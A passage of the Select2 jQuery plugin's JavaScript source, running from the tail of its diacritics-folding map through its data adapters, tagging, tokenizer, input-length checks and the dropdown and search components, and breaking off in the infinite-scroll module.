              Ṉ: "N",
              Ƞ: "N",
              Ɲ: "N",
              Ꞑ: "N",
              Ꞥ: "N",
              Ǌ: "NJ",
              ǋ: "Nj",
              "Ⓞ": "O",
              Ｏ: "O",
              Ò: "O",
              Ó: "O",
              Ô: "O",
              Ồ: "O",
              Ố: "O",
              Ỗ: "O",
              Ổ: "O",
              Õ: "O",
              Ṍ: "O",
              Ȭ: "O",
              Ṏ: "O",
              Ō: "O",
              Ṑ: "O",
              Ṓ: "O",
              Ŏ: "O",
              Ȯ: "O",
              Ȱ: "O",
              Ö: "O",
              Ȫ: "O",
              Ỏ: "O",
              Ő: "O",
              Ǒ: "O",
              Ȍ: "O",
              Ȏ: "O",
              Ơ: "O",
              Ờ: "O",
              Ớ: "O",
              Ỡ: "O",
              Ở: "O",
              Ợ: "O",
              Ọ: "O",
              Ộ: "O",
              Ǫ: "O",
              Ǭ: "O",
              Ø: "O",
              Ǿ: "O",
              Ɔ: "O",
              Ɵ: "O",
              Ꝋ: "O",
              Ꝍ: "O",
              Œ: "OE",
              Ƣ: "OI",
              Ꝏ: "OO",
              Ȣ: "OU",
              "Ⓟ": "P",
              Ｐ: "P",
              Ṕ: "P",
              Ṗ: "P",
              Ƥ: "P",
              Ᵽ: "P",
              Ꝑ: "P",
              Ꝓ: "P",
              Ꝕ: "P",
              "Ⓠ": "Q",
              Ｑ: "Q",
              Ꝗ: "Q",
              Ꝙ: "Q",
              Ɋ: "Q",
              "Ⓡ": "R",
              Ｒ: "R",
              Ŕ: "R",
              Ṙ: "R",
              Ř: "R",
              Ȑ: "R",
              Ȓ: "R",
              Ṛ: "R",
              Ṝ: "R",
              Ŗ: "R",
              Ṟ: "R",
              Ɍ: "R",
              Ɽ: "R",
              Ꝛ: "R",
              Ꞧ: "R",
              Ꞃ: "R",
              "Ⓢ": "S",
              Ｓ: "S",
              ẞ: "S",
              Ś: "S",
              Ṥ: "S",
              Ŝ: "S",
              Ṡ: "S",
              Š: "S",
              Ṧ: "S",
              Ṣ: "S",
              Ṩ: "S",
              Ș: "S",
              Ş: "S",
              Ȿ: "S",
              Ꞩ: "S",
              Ꞅ: "S",
              "Ⓣ": "T",
              Ｔ: "T",
              Ṫ: "T",
              Ť: "T",
              Ṭ: "T",
              Ț: "T",
              Ţ: "T",
              Ṱ: "T",
              Ṯ: "T",
              Ŧ: "T",
              Ƭ: "T",
              Ʈ: "T",
              Ⱦ: "T",
              Ꞇ: "T",
              Ꜩ: "TZ",
              "Ⓤ": "U",
              Ｕ: "U",
              Ù: "U",
              Ú: "U",
              Û: "U",
              Ũ: "U",
              Ṹ: "U",
              Ū: "U",
              Ṻ: "U",
              Ŭ: "U",
              Ü: "U",
              Ǜ: "U",
              Ǘ: "U",
              Ǖ: "U",
              Ǚ: "U",
              Ủ: "U",
              Ů: "U",
              Ű: "U",
              Ǔ: "U",
              Ȕ: "U",
              Ȗ: "U",
              Ư: "U",
              Ừ: "U",
              Ứ: "U",
              Ữ: "U",
              Ử: "U",
              Ự: "U",
              Ụ: "U",
              Ṳ: "U",
              Ų: "U",
              Ṷ: "U",
              Ṵ: "U",
              Ʉ: "U",
              "Ⓥ": "V",
              Ｖ: "V",
              Ṽ: "V",
              Ṿ: "V",
              Ʋ: "V",
              Ꝟ: "V",
              Ʌ: "V",
              Ꝡ: "VY",
              "Ⓦ": "W",
              Ｗ: "W",
              Ẁ: "W",
              Ẃ: "W",
              Ŵ: "W",
              Ẇ: "W",
              Ẅ: "W",
              Ẉ: "W",
              Ⱳ: "W",
              "Ⓧ": "X",
              Ｘ: "X",
              Ẋ: "X",
              Ẍ: "X",
              "Ⓨ": "Y",
              Ｙ: "Y",
              Ỳ: "Y",
              Ý: "Y",
              Ŷ: "Y",
              Ỹ: "Y",
              Ȳ: "Y",
              Ẏ: "Y",
              Ÿ: "Y",
              Ỷ: "Y",
              Ỵ: "Y",
              Ƴ: "Y",
              Ɏ: "Y",
              Ỿ: "Y",
              "Ⓩ": "Z",
              Ｚ: "Z",
              Ź: "Z",
              Ẑ: "Z",
              Ż: "Z",
              Ž: "Z",
              Ẓ: "Z",
              Ẕ: "Z",
              Ƶ: "Z",
              Ȥ: "Z",
              Ɀ: "Z",
              Ⱬ: "Z",
              Ꝣ: "Z",
              "ⓐ": "a",
              ａ: "a",
              ẚ: "a",
              à: "a",
              á: "a",
              â: "a",
              ầ: "a",
              ấ: "a",
              ẫ: "a",
              ẩ: "a",
              ã: "a",
              ā: "a",
              ă: "a",
              ằ: "a",
              ắ: "a",
              ẵ: "a",
              ẳ: "a",
              ȧ: "a",
              ǡ: "a",
              ä: "a",
              ǟ: "a",
              ả: "a",
              å: "a",
              ǻ: "a",
              ǎ: "a",
              ȁ: "a",
              ȃ: "a",
              ạ: "a",
              ậ: "a",
              ặ: "a",
              ḁ: "a",
              ą: "a",
              ⱥ: "a",
              ɐ: "a",
              ꜳ: "aa",
              æ: "ae",
              ǽ: "ae",
              ǣ: "ae",
              ꜵ: "ao",
              ꜷ: "au",
              ꜹ: "av",
              ꜻ: "av",
              ꜽ: "ay",
              "ⓑ": "b",
              ｂ: "b",
              ḃ: "b",
              ḅ: "b",
              ḇ: "b",
              ƀ: "b",
              ƃ: "b",
              ɓ: "b",
              "ⓒ": "c",
              ｃ: "c",
              ć: "c",
              ĉ: "c",
              ċ: "c",
              č: "c",
              ç: "c",
              ḉ: "c",
              ƈ: "c",
              ȼ: "c",
              ꜿ: "c",
              ↄ: "c",
              "ⓓ": "d",
              ｄ: "d",
              ḋ: "d",
              ď: "d",
              ḍ: "d",
              ḑ: "d",
              ḓ: "d",
              ḏ: "d",
              đ: "d",
              ƌ: "d",
              ɖ: "d",
              ɗ: "d",
              ꝺ: "d",
              ǳ: "dz",
              ǆ: "dz",
              "ⓔ": "e",
              ｅ: "e",
              è: "e",
              é: "e",
              ê: "e",
              ề: "e",
              ế: "e",
              ễ: "e",
              ể: "e",
              ẽ: "e",
              ē: "e",
              ḕ: "e",
              ḗ: "e",
              ĕ: "e",
              ė: "e",
              ë: "e",
              ẻ: "e",
              ě: "e",
              ȅ: "e",
              ȇ: "e",
              ẹ: "e",
              ệ: "e",
              ȩ: "e",
              ḝ: "e",
              ę: "e",
              ḙ: "e",
              ḛ: "e",
              ɇ: "e",
              ɛ: "e",
              ǝ: "e",
              "ⓕ": "f",
              ｆ: "f",
              ḟ: "f",
              ƒ: "f",
              ꝼ: "f",
              "ⓖ": "g",
              ｇ: "g",
              ǵ: "g",
              ĝ: "g",
              ḡ: "g",
              ğ: "g",
              ġ: "g",
              ǧ: "g",
              ģ: "g",
              ǥ: "g",
              ɠ: "g",
              ꞡ: "g",
              ᵹ: "g",
              ꝿ: "g",
              "ⓗ": "h",
              ｈ: "h",
              ĥ: "h",
              ḣ: "h",
              ḧ: "h",
              ȟ: "h",
              ḥ: "h",
              ḩ: "h",
              ḫ: "h",
              ẖ: "h",
              ħ: "h",
              ⱨ: "h",
              ⱶ: "h",
              ɥ: "h",
              ƕ: "hv",
              "ⓘ": "i",
              ｉ: "i",
              ì: "i",
              í: "i",
              î: "i",
              ĩ: "i",
              ī: "i",
              ĭ: "i",
              ï: "i",
              ḯ: "i",
              ỉ: "i",
              ǐ: "i",
              ȉ: "i",
              ȋ: "i",
              ị: "i",
              į: "i",
              ḭ: "i",
              ɨ: "i",
              ı: "i",
              "ⓙ": "j",
              ｊ: "j",
              ĵ: "j",
              ǰ: "j",
              ɉ: "j",
              "ⓚ": "k",
              ｋ: "k",
              ḱ: "k",
              ǩ: "k",
              ḳ: "k",
              ķ: "k",
              ḵ: "k",
              ƙ: "k",
              ⱪ: "k",
              ꝁ: "k",
              ꝃ: "k",
              ꝅ: "k",
              ꞣ: "k",
              "ⓛ": "l",
              ｌ: "l",
              ŀ: "l",
              ĺ: "l",
              ľ: "l",
              ḷ: "l",
              ḹ: "l",
              ļ: "l",
              ḽ: "l",
              ḻ: "l",
              ſ: "l",
              ł: "l",
              ƚ: "l",
              ɫ: "l",
              ⱡ: "l",
              ꝉ: "l",
              ꞁ: "l",
              ꝇ: "l",
              ǉ: "lj",
              "ⓜ": "m",
              ｍ: "m",
              ḿ: "m",
              ṁ: "m",
              ṃ: "m",
              ɱ: "m",
              ɯ: "m",
              "ⓝ": "n",
              ｎ: "n",
              ǹ: "n",
              ń: "n",
              ñ: "n",
              ṅ: "n",
              ň: "n",
              ṇ: "n",
              ņ: "n",
              ṋ: "n",
              ṉ: "n",
              ƞ: "n",
              ɲ: "n",
              ŉ: "n",
              ꞑ: "n",
              ꞥ: "n",
              ǌ: "nj",
              "ⓞ": "o",
              ｏ: "o",
              ò: "o",
              ó: "o",
              ô: "o",
              ồ: "o",
              ố: "o",
              ỗ: "o",
              ổ: "o",
              õ: "o",
              ṍ: "o",
              ȭ: "o",
              ṏ: "o",
              ō: "o",
              ṑ: "o",
              ṓ: "o",
              ŏ: "o",
              ȯ: "o",
              ȱ: "o",
              ö: "o",
              ȫ: "o",
              ỏ: "o",
              ő: "o",
              ǒ: "o",
              ȍ: "o",
              ȏ: "o",
              ơ: "o",
              ờ: "o",
              ớ: "o",
              ỡ: "o",
              ở: "o",
              ợ: "o",
              ọ: "o",
              ộ: "o",
              ǫ: "o",
              ǭ: "o",
              ø: "o",
              ǿ: "o",
              ɔ: "o",
              ꝋ: "o",
              ꝍ: "o",
              ɵ: "o",
              œ: "oe",
              ƣ: "oi",
              ȣ: "ou",
              ꝏ: "oo",
              "ⓟ": "p",
              ｐ: "p",
              ṕ: "p",
              ṗ: "p",
              ƥ: "p",
              ᵽ: "p",
              ꝑ: "p",
              ꝓ: "p",
              ꝕ: "p",
              "ⓠ": "q",
              ｑ: "q",
              ɋ: "q",
              ꝗ: "q",
              ꝙ: "q",
              "ⓡ": "r",
              ｒ: "r",
              ŕ: "r",
              ṙ: "r",
              ř: "r",
              ȑ: "r",
              ȓ: "r",
              ṛ: "r",
              ṝ: "r",
              ŗ: "r",
              ṟ: "r",
              ɍ: "r",
              ɽ: "r",
              ꝛ: "r",
              ꞧ: "r",
              ꞃ: "r",
              "ⓢ": "s",
              ｓ: "s",
              ß: "s",
              ś: "s",
              ṥ: "s",
              ŝ: "s",
              ṡ: "s",
              š: "s",
              ṧ: "s",
              ṣ: "s",
              ṩ: "s",
              ș: "s",
              ş: "s",
              ȿ: "s",
              ꞩ: "s",
              ꞅ: "s",
              ẛ: "s",
              "ⓣ": "t",
              ｔ: "t",
              ṫ: "t",
              ẗ: "t",
              ť: "t",
              ṭ: "t",
              ț: "t",
              ţ: "t",
              ṱ: "t",
              ṯ: "t",
              ŧ: "t",
              ƭ: "t",
              ʈ: "t",
              ⱦ: "t",
              ꞇ: "t",
              ꜩ: "tz",
              "ⓤ": "u",
              ｕ: "u",
              ù: "u",
              ú: "u",
              û: "u",
              ũ: "u",
              ṹ: "u",
              ū: "u",
              ṻ: "u",
              ŭ: "u",
              ü: "u",
              ǜ: "u",
              ǘ: "u",
              ǖ: "u",
              ǚ: "u",
              ủ: "u",
              ů: "u",
              ű: "u",
              ǔ: "u",
              ȕ: "u",
              ȗ: "u",
              ư: "u",
              ừ: "u",
              ứ: "u",
              ữ: "u",
              ử: "u",
              ự: "u",
              ụ: "u",
              ṳ: "u",
              ų: "u",
              ṷ: "u",
              ṵ: "u",
              ʉ: "u",
              "ⓥ": "v",
              ｖ: "v",
              ṽ: "v",
              ṿ: "v",
              ʋ: "v",
              ꝟ: "v",
              ʌ: "v",
              ꝡ: "vy",
              "ⓦ": "w",
              ｗ: "w",
              ẁ: "w",
              ẃ: "w",
              ŵ: "w",
              ẇ: "w",
              ẅ: "w",
              ẘ: "w",
              ẉ: "w",
              ⱳ: "w",
              "ⓧ": "x",
              ｘ: "x",
              ẋ: "x",
              ẍ: "x",
              "ⓨ": "y",
              ｙ: "y",
              ỳ: "y",
              ý: "y",
              ŷ: "y",
              ỹ: "y",
              ȳ: "y",
              ẏ: "y",
              ÿ: "y",
              ỷ: "y",
              ẙ: "y",
              ỵ: "y",
              ƴ: "y",
              ɏ: "y",
              ỿ: "y",
              "ⓩ": "z",
              ｚ: "z",
              ź: "z",
              ẑ: "z",
              ż: "z",
              ž: "z",
              ẓ: "z",
              ẕ: "z",
              ƶ: "z",
              ȥ: "z",
              ɀ: "z",
              ⱬ: "z",
              ꝣ: "z",
              Ά: "Α",
              Έ: "Ε",
              Ή: "Η",
              Ί: "Ι",
              Ϊ: "Ι",
              Ό: "Ο",
              Ύ: "Υ",
              Ϋ: "Υ",
              Ώ: "Ω",
              ά: "α",
              έ: "ε",
              ή: "η",
              ί: "ι",
              ϊ: "ι",
              ΐ: "ι",
              ό: "ο",
              ύ: "υ",
              ϋ: "υ",
              ΰ: "υ",
              ώ: "ω",
              ς: "σ",
              "’": "'",
            };
          }),
          t.define("select2/data/base", ["../utils"], function (e) {
            function t(e, n) {
              t.__super__.constructor.call(this);
            }
            return (
              e.Extend(t, e.Observable),
              (t.prototype.current = function (e) {
                throw new Error(
                  "The `current` method must be defined in child classes."
                );
              }),
              (t.prototype.query = function (e, t) {
                throw new Error(
                  "The `query` method must be defined in child classes."
                );
              }),
              (t.prototype.bind = function (e, t) {}),
              (t.prototype.destroy = function () {}),
              (t.prototype.generateResultId = function (t, n) {
                var r = t.id + "-result-";
                return (
                  (r += e.generateChars(4)),
                  null != n.id
                    ? (r += "-" + n.id.toString())
                    : (r += "-" + e.generateChars(4)),
                  r
                );
              }),
              t
            );
          }),
          t.define(
            "select2/data/select",
            ["./base", "../utils", "jquery"],
            function (e, t, n) {
              function r(e, t) {
                (this.$element = e),
                  (this.options = t),
                  r.__super__.constructor.call(this);
              }
              return (
                t.Extend(r, e),
                (r.prototype.current = function (e) {
                  var t = this;
                  e(
                    Array.prototype.map.call(
                      this.$element[0].querySelectorAll(":checked"),
                      function (e) {
                        return t.item(n(e));
                      }
                    )
                  );
                }),
                (r.prototype.select = function (e) {
                  var t = this;
                  if (
                    ((e.selected = !0),
                    null != e.element &&
                      "option" === e.element.tagName.toLowerCase())
                  )
                    return (
                      (e.element.selected = !0),
                      void this.$element.trigger("input").trigger("change")
                    );
                  if (this.$element.prop("multiple"))
                    this.current(function (n) {
                      var r = [];
                      (e = [e]).push.apply(e, n);
                      for (var i = 0; i < e.length; i++) {
                        var o = e[i].id;
                        -1 === r.indexOf(o) && r.push(o);
                      }
                      t.$element.val(r),
                        t.$element.trigger("input").trigger("change");
                    });
                  else {
                    var n = e.id;
                    this.$element.val(n),
                      this.$element.trigger("input").trigger("change");
                  }
                }),
                (r.prototype.unselect = function (e) {
                  var t = this;
                  if (this.$element.prop("multiple")) {
                    if (
                      ((e.selected = !1),
                      null != e.element &&
                        "option" === e.element.tagName.toLowerCase())
                    )
                      return (
                        (e.element.selected = !1),
                        void this.$element.trigger("input").trigger("change")
                      );
                    this.current(function (n) {
                      for (var r = [], i = 0; i < n.length; i++) {
                        var o = n[i].id;
                        o !== e.id && -1 === r.indexOf(o) && r.push(o);
                      }
                      t.$element.val(r),
                        t.$element.trigger("input").trigger("change");
                    });
                  }
                }),
                (r.prototype.bind = function (e, t) {
                  var n = this;
                  (this.container = e),
                    e.on("select", function (e) {
                      n.select(e.data);
                    }),
                    e.on("unselect", function (e) {
                      n.unselect(e.data);
                    });
                }),
                (r.prototype.destroy = function () {
                  this.$element.find("*").each(function () {
                    t.RemoveData(this);
                  });
                }),
                (r.prototype.query = function (e, t) {
                  var r = [],
                    i = this;
                  this.$element.children().each(function () {
                    if (
                      "option" === this.tagName.toLowerCase() ||
                      "optgroup" === this.tagName.toLowerCase()
                    ) {
                      var t = n(this),
                        o = i.item(t),
                        s = i.matches(e, o);
                      null !== s && r.push(s);
                    }
                  }),
                    t({ results: r });
                }),
                (r.prototype.addOptions = function (e) {
                  this.$element.append(e);
                }),
                (r.prototype.option = function (e) {
                  var r;
                  e.children
                    ? ((r = document.createElement("optgroup")).label = e.text)
                    : void 0 !==
                      (r = document.createElement("option")).textContent
                    ? (r.textContent = e.text)
                    : (r.innerText = e.text),
                    void 0 !== e.id && (r.value = e.id),
                    e.disabled && (r.disabled = !0),
                    e.selected && (r.selected = !0),
                    e.title && (r.title = e.title);
                  var i = this._normalizeItem(e);
                  return (i.element = r), t.StoreData(r, "data", i), n(r);
                }),
                (r.prototype.item = function (e) {
                  var r = {};
                  if (null != (r = t.GetData(e[0], "data"))) return r;
                  var i = e[0];
                  if ("option" === i.tagName.toLowerCase())
                    r = {
                      id: e.val(),
                      text: e.text(),
                      disabled: e.prop("disabled"),
                      selected: e.prop("selected"),
                      title: e.prop("title"),
                    };
                  else if ("optgroup" === i.tagName.toLowerCase()) {
                    r = {
                      text: e.prop("label"),
                      children: [],
                      title: e.prop("title"),
                    };
                    for (
                      var o = e.children("option"), s = [], a = 0;
                      a < o.length;
                      a++
                    ) {
                      var l = n(o[a]),
                        c = this.item(l);
                      s.push(c);
                    }
                    r.children = s;
                  }
                  return (
                    ((r = this._normalizeItem(r)).element = e[0]),
                    t.StoreData(e[0], "data", r),
                    r
                  );
                }),
                (r.prototype._normalizeItem = function (e) {
                  return (
                    e !== Object(e) && (e = { id: e, text: e }),
                    null != (e = n.extend({}, { text: "" }, e)).id &&
                      (e.id = e.id.toString()),
                    null != e.text && (e.text = e.text.toString()),
                    null == e._resultId &&
                      e.id &&
                      null != this.container &&
                      (e._resultId = this.generateResultId(this.container, e)),
                    n.extend({}, { selected: !1, disabled: !1 }, e)
                  );
                }),
                (r.prototype.matches = function (e, t) {
                  return this.options.get("matcher")(e, t);
                }),
                r
              );
            }
          ),
          t.define(
            "select2/data/array",
            ["./select", "../utils", "jquery"],
            function (e, t, n) {
              function r(e, t) {
                (this._dataToConvert = t.get("data") || []),
                  r.__super__.constructor.call(this, e, t);
              }
              return (
                t.Extend(r, e),
                (r.prototype.bind = function (e, t) {
                  r.__super__.bind.call(this, e, t),
                    this.addOptions(this.convertToOptions(this._dataToConvert));
                }),
                (r.prototype.select = function (e) {
                  var t = this.$element.find("option").filter(function (t, n) {
                    return n.value == e.id.toString();
                  });
                  0 === t.length && ((t = this.option(e)), this.addOptions(t)),
                    r.__super__.select.call(this, e);
                }),
                (r.prototype.convertToOptions = function (e) {
                  for (
                    var t = function (e) {
                        return function () {
                          return n(this).val() == e.id;
                        };
                      },
                      r = this,
                      i = this.$element.find("option"),
                      o = i
                        .map(function () {
                          return r.item(n(this)).id;
                        })
                        .get(),
                      s = [],
                      a = 0;
                    a < e.length;
                    a++
                  ) {
                    var l = this._normalizeItem(e[a]);
                    if (o.indexOf(l.id) >= 0) {
                      var c = i.filter(t(l)),
                        u = this.item(c),
                        d = n.extend(!0, {}, l, u),
                        p = this.option(d);
                      c.replaceWith(p);
                    } else {
                      var f = this.option(l);
                      if (l.children) {
                        var h = this.convertToOptions(l.children);
                        f.append(h);
                      }
                      s.push(f);
                    }
                  }
                  return s;
                }),
                r
              );
            }
          ),
          t.define(
            "select2/data/ajax",
            ["./array", "../utils", "jquery"],
            function (e, t, n) {
              function r(e, t) {
                (this.ajaxOptions = this._applyDefaults(t.get("ajax"))),
                  null != this.ajaxOptions.processResults &&
                    (this.processResults = this.ajaxOptions.processResults),
                  r.__super__.constructor.call(this, e, t);
              }
              return (
                t.Extend(r, e),
                (r.prototype._applyDefaults = function (e) {
                  var t = {
                    data: function (e) {
                      return n.extend({}, e, { q: e.term });
                    },
                    transport: function (e, t, r) {
                      var i = n.ajax(e);
                      return i.then(t), i.fail(r), i;
                    },
                  };
                  return n.extend({}, t, e, !0);
                }),
                (r.prototype.processResults = function (e) {
                  return e;
                }),
                (r.prototype.query = function (e, t) {
                  var r = function () {
                      var n = o.transport(
                        o,
                        function (n) {
                          var r = i.processResults(n, e);
                          i.options.get("debug") &&
                            window.console &&
                            console.error &&
                            ((r && r.results && Array.isArray(r.results)) ||
                              console.error(
                                "Select2: The AJAX results did not return an array in the `results` key of the response."
                              )),
                            t(r);
                        },
                        function () {
                          (!("status" in n) ||
                            (0 !== n.status && "0" !== n.status)) &&
                            i.trigger("results:message", {
                              message: "errorLoading",
                            });
                        }
                      );
                      i._request = n;
                    },
                    i = this;
                  null != this._request &&
                    ("function" == typeof this._request.abort &&
                      this._request.abort(),
                    (this._request = null));
                  var o = n.extend({ type: "GET" }, this.ajaxOptions);
                  "function" == typeof o.url &&
                    (o.url = o.url.call(this.$element, e)),
                    "function" == typeof o.data &&
                      (o.data = o.data.call(this.$element, e)),
                    this.ajaxOptions.delay && null != e.term
                      ? (this._queryTimeout &&
                          window.clearTimeout(this._queryTimeout),
                        (this._queryTimeout = window.setTimeout(
                          r,
                          this.ajaxOptions.delay
                        )))
                      : r();
                }),
                r
              );
            }
          ),
          t.define("select2/data/tags", ["jquery"], function (e) {
            var t = function (e, t, n) {
              var r = n.get("tags"),
                i = n.get("createTag");
              void 0 !== i && (this.createTag = i);
              var o = n.get("insertTag");
              if (
                (void 0 !== o && (this.insertTag = o),
                e.call(this, t, n),
                Array.isArray(r))
              )
                for (var s = 0; s < r.length; s++) {
                  var a = r[s],
                    l = this._normalizeItem(a),
                    c = this.option(l);
                  this.$element.append(c);
                }
            };
            return (
              (t.prototype.query = function (e, t, n) {
                var r = this;
                this._removeOldTags(),
                  null != t.term && null == t.page
                    ? e.call(this, t, function e(i, o) {
                        for (var s = i.results, a = 0; a < s.length; a++) {
                          var l = s[a],
                            c =
                              null != l.children &&
                              !e({ results: l.children }, !0);
                          if (
                            (l.text || "").toUpperCase() ===
                              (t.term || "").toUpperCase() ||
                            c
                          )
                            return !o && ((i.data = s), void n(i));
                        }
                        if (o) return !0;
                        var u = r.createTag(t);
                        if (null != u) {
                          var d = r.option(u);
                          d.attr("data-select2-tag", "true"),
                            r.addOptions([d]),
                            r.insertTag(s, u);
                        }
                        (i.results = s), n(i);
                      })
                    : e.call(this, t, n);
              }),
              (t.prototype.createTag = function (e, t) {
                if (null == t.term) return null;
                var n = t.term.trim();
                return "" === n ? null : { id: n, text: n };
              }),
              (t.prototype.insertTag = function (e, t, n) {
                t.unshift(n);
              }),
              (t.prototype._removeOldTags = function (t) {
                this.$element
                  .find("option[data-select2-tag]")
                  .each(function () {
                    this.selected || e(this).remove();
                  });
              }),
              t
            );
          }),
          t.define("select2/data/tokenizer", ["jquery"], function (e) {
            var t = function (e, t, n) {
              var r = n.get("tokenizer");
              void 0 !== r && (this.tokenizer = r), e.call(this, t, n);
            };
            return (
              (t.prototype.bind = function (e, t, n) {
                e.call(this, t, n),
                  (this.$search =
                    t.dropdown.$search ||
                    t.selection.$search ||
                    n.find(".select2-search__field"));
              }),
              (t.prototype.query = function (t, n, r) {
                var o = this;
                n.term = n.term || "";
                var s = this.tokenizer(n, this.options, function (t) {
                  var n = o._normalizeItem(t);
                  if (
                    !o.$element.find("option").filter(function () {
                      return e(this).val() === n.id;
                    }).length
                  ) {
                    var r = o.option(n);
                    r.attr("data-select2-tag", !0),
                      o._removeOldTags(),
                      o.addOptions([r]);
                  }
                  !(function (e) {
                    o.trigger("select", { data: e });
                  })(n);
                });
                s.term !== n.term &&
                  (this.$search.length &&
                    (this.$search.val(s.term), this.$search.trigger("focus")),
                  (n.term = s.term)),
                  t.call(this, n, r);
              }),
              (t.prototype.tokenizer = function (t, n, r, i) {
                for (
                  var o = r.get("tokenSeparators") || [],
                    s = n.term,
                    a = 0,
                    l =
                      this.createTag ||
                      function (e) {
                        return { id: e.term, text: e.term };
                      };
                  a < s.length;

                ) {
                  var c = s[a];
                  if (-1 !== o.indexOf(c)) {
                    var u = s.substr(0, a),
                      d = l(e.extend({}, n, { term: u }));
                    null != d
                      ? (i(d), (s = s.substr(a + 1) || ""), (a = 0))
                      : a++;
                  } else a++;
                }
                return { term: s };
              }),
              t
            );
          }),
          t.define("select2/data/minimumInputLength", [], function () {
            var e = function (e, t, n) {
              (this.minimumInputLength = n.get("minimumInputLength")),
                e.call(this, t, n);
            };
            return (
              (e.prototype.query = function (e, t, n) {
                (t.term = t.term || ""),
                  t.term.length < this.minimumInputLength
                    ? this.trigger("results:message", {
                        message: "inputTooShort",
                        args: {
                          minimum: this.minimumInputLength,
                          input: t.term,
                          params: t,
                        },
                      })
                    : e.call(this, t, n);
              }),
              e
            );
          }),
          t.define("select2/data/maximumInputLength", [], function () {
            var e = function (e, t, n) {
              (this.maximumInputLength = n.get("maximumInputLength")),
                e.call(this, t, n);
            };
            return (
              (e.prototype.query = function (e, t, n) {
                (t.term = t.term || ""),
                  this.maximumInputLength > 0 &&
                  t.term.length > this.maximumInputLength
                    ? this.trigger("results:message", {
                        message: "inputTooLong",
                        args: {
                          maximum: this.maximumInputLength,
                          input: t.term,
                          params: t,
                        },
                      })
                    : e.call(this, t, n);
              }),
              e
            );
          }),
          t.define("select2/data/maximumSelectionLength", [], function () {
            var e = function (e, t, n) {
              (this.maximumSelectionLength = n.get("maximumSelectionLength")),
                e.call(this, t, n);
            };
            return (
              (e.prototype.bind = function (e, t, n) {
                var r = this;
                e.call(this, t, n),
                  t.on("select", function () {
                    r._checkIfMaximumSelected();
                  });
              }),
              (e.prototype.query = function (e, t, n) {
                var r = this;
                this._checkIfMaximumSelected(function () {
                  e.call(r, t, n);
                });
              }),
              (e.prototype._checkIfMaximumSelected = function (e, t) {
                var n = this;
                this.current(function (e) {
                  var r = null != e ? e.length : 0;
                  n.maximumSelectionLength > 0 && r >= n.maximumSelectionLength
                    ? n.trigger("results:message", {
                        message: "maximumSelected",
                        args: { maximum: n.maximumSelectionLength },
                      })
                    : t && t();
                });
              }),
              e
            );
          }),
          t.define("select2/dropdown", ["jquery", "./utils"], function (e, t) {
            function n(e, t) {
              (this.$element = e),
                (this.options = t),
                n.__super__.constructor.call(this);
            }
            return (
              t.Extend(n, t.Observable),
              (n.prototype.render = function () {
                var t = e(
                  '<span class="select2-dropdown"><span class="select2-results"></span></span>'
                );
                return (
                  t.attr("dir", this.options.get("dir")),
                  (this.$dropdown = t),
                  t
                );
              }),
              (n.prototype.bind = function () {}),
              (n.prototype.position = function (e, t) {}),
              (n.prototype.destroy = function () {
                this.$dropdown.remove();
              }),
              n
            );
          }),
          t.define("select2/dropdown/search", ["jquery"], function (e) {
            var t = function () {};
            return (
              (t.prototype.render = function (t) {
                var n = t.call(this),
                  r = this.options.get("translations").get("search"),
                  i = e(
                    '<span class="select2-search select2-search--dropdown"><input class="select2-search__field" type="search" tabindex="-1" autocorrect="off" autocapitalize="none" spellcheck="false" role="searchbox" aria-autocomplete="list" /></span>'
                  );
                return (
                  (this.$searchContainer = i),
                  (this.$search = i.find("input")),
                  this.$search.prop(
                    "autocomplete",
                    this.options.get("autocomplete")
                  ),
                  this.$search.attr("aria-label", r()),
                  n.prepend(i),
                  n
                );
              }),
              (t.prototype.bind = function (t, n, r) {
                var i = this,
                  o = n.id + "-results";
                t.call(this, n, r),
                  this.$search.on("keydown", function (e) {
                    i.trigger("keypress", e),
                      (i._keyUpPrevented = e.isDefaultPrevented());
                  }),
                  this.$search.on("input", function (t) {
                    e(this).off("keyup");
                  }),
                  this.$search.on("keyup input", function (e) {
                    i.handleSearch(e);
                  }),
                  n.on("open", function () {
                    i.$search.attr("tabindex", 0),
                      i.$search.attr("aria-controls", o),
                      i.$search.trigger("focus"),
                      window.setTimeout(function () {
                        i.$search.trigger("focus");
                      }, 0);
                  }),
                  n.on("close", function () {
                    i.$search.attr("tabindex", -1),
                      i.$search.removeAttr("aria-controls"),
                      i.$search.removeAttr("aria-activedescendant"),
                      i.$search.val(""),
                      i.$search.trigger("blur");
                  }),
                  n.on("focus", function () {
                    n.isOpen() || i.$search.trigger("focus");
                  }),
                  n.on("results:all", function (e) {
                    (null != e.query.term && "" !== e.query.term) ||
                      (i.showSearch(e)
                        ? i.$searchContainer[0].classList.remove(
                            "select2-search--hide"
                          )
                        : i.$searchContainer[0].classList.add(
                            "select2-search--hide"
                          ));
                  }),
                  n.on("results:focus", function (e) {
                    e.data._resultId
                      ? i.$search.attr(
                          "aria-activedescendant",
                          e.data._resultId
                        )
                      : i.$search.removeAttr("aria-activedescendant");
                  });
              }),
              (t.prototype.handleSearch = function (e) {
                if (!this._keyUpPrevented) {
                  var t = this.$search.val();
                  this.trigger("query", { term: t });
                }
                this._keyUpPrevented = !1;
              }),
              (t.prototype.showSearch = function (e, t) {
                return !0;
              }),
              t
            );
          }),
          t.define("select2/dropdown/hidePlaceholder", [], function () {
            var e = function (e, t, n, r) {
              (this.placeholder = this.normalizePlaceholder(
                n.get("placeholder")
              )),
                e.call(this, t, n, r);
            };
            return (
              (e.prototype.append = function (e, t) {
                (t.results = this.removePlaceholder(t.results)),
                  e.call(this, t);
              }),
              (e.prototype.normalizePlaceholder = function (e, t) {
                return "string" == typeof t && (t = { id: "", text: t }), t;
              }),
              (e.prototype.removePlaceholder = function (e, t) {
                for (var n = t.slice(0), r = t.length - 1; r >= 0; r--) {
                  var i = t[r];
                  this.placeholder.id === i.id && n.splice(r, 1);
                }
                return n;
              }),
              e
            );
          }),
          t.define("select2/dropdown/infiniteScroll", ["jquery"], function (e) {
            var t = function (e, t, n, r) {
              (this.lastParams = {}),
                e.call(this, t, n, r),
                (this.$loadingMore = this.createLoadingMore()),
                (this.loading = !1);
            };
            return (
              (t.prototype.append = function (e, t) {
                this.$loadingMore.remove(),
                  (this.loading = !1),
                  e.call(this, t),
                  this.showLoadingMore(t) &&
                    (this.$results.append(this.$loadingMore),
                    this.loadMoreIfNeeded());
              }),
              (t.prototype.bind = function (e, t, n) {
                var r = this;
                e.call(this, t, n),
                  t.on("query", function (e) {
                    (r.lastParams = e), (r.loading = !0);
                  }),
                  t.on("query:append", function (e) {
                    (r.lastParams = e), (r.loading = !0);
                  }),
